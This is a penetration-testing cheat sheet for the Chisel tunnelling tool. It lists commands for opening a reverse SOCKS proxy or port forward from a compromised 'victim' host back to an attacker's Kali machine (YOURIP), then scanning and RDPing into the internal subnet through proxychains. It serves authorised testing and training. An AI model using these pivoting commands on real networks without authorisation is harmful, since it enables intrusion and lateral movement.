# 🔀 Chisel

> A single static binary that builds a **SOCKS proxy or port forward over HTTP** — the go-to pivot when you have a shell on the host but **no SSH creds**. Upload the matching-arch binary, run reverse SOCKS back to your Kali, then proxychains the internal subnet.

Part of [[Pivoting and Port Forwarding]]. Related: [[Proxychains & SOCKS]] · [[Ligolo-ng]] · [[File Transfer]]

---

## 🧠 THINK
- Use when there are **no SSH creds** but you have a shell — just need to upload one binary.
- **Reverse** mode: Kali runs the server, victim connects out to it (beats inbound firewalls).
- Match the **victim's arch** (x64/x86, linux/windows) for the uploaded binary.
- Pair with proxychains → [[Proxychains & SOCKS]].

## 💥 REVERSE SOCKS (whole subnet)
Kali (server):
```bash
./chisel server -p 8000 --reverse
```
Victim/pivot (upload chisel first → [[File Transfer]]):
```bash
./chisel client YOURIP:8000 R:socks
```
This opens SOCKS5 on your `127.0.0.1:1080`. Then:
```bash
proxychains nmap -sT -Pn 172.16.1.0/24
```
```bash
proxychains xfreerdp /u:user /p:pass /v:172.16.1.5
```

## 💥 SINGLE PORT FORWARD (reverse)
Bring internal `172.16.1.5:3389` to your `127.0.0.1:3389`:
```bash
./chisel client YOURIP:8000 R:3389:172.16.1.5:3389
```
Then RDP to `127.0.0.1:3389`. (Server side is the same `chisel server -p 8000 --reverse`.)

## 🔁 FOUND → NEXT
| SITUATION | NEXT |
|---|---|
| Need whole-subnet scan | `R:socks` → [[Proxychains & SOCKS]] |
| One internal service/GUI | `R:<lport>:<host>:<port>` single forward |
| SSH creds available | simpler with [[SSH Tunneling]] |
| Want no proxychains | [[Ligolo-ng]] (TUN interface) |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Client won't connect back | wrong YOURIP (tun0) / blocked port — use 443/80; check pivot egress |
| Wrong arch | upload the matching chisel build (x64/x86, linux/windows) |
| Can't upload chisel | use [[SSH Tunneling]] if creds; or socat if present |
| SOCKS scan misses hosts | `-sT -Pn` only → [[Proxychains & SOCKS]] |
| Double pivot | stack chisel, or use [[Ligolo-ng]] double-tunnel |

## 📇 CHEAT SHEET
```bash
./chisel server -p 8000 --reverse           # Kali
```
```bash
./chisel client YOURIP:8000 R:socks         # victim -> proxychains
```
```bash
./chisel client YOURIP:8000 R:3389:172.16.1.5:3389   # single-port forward
```
**Kill shot:** no SSH creds → upload chisel → reverse SOCKS → proxychains internal subnet.
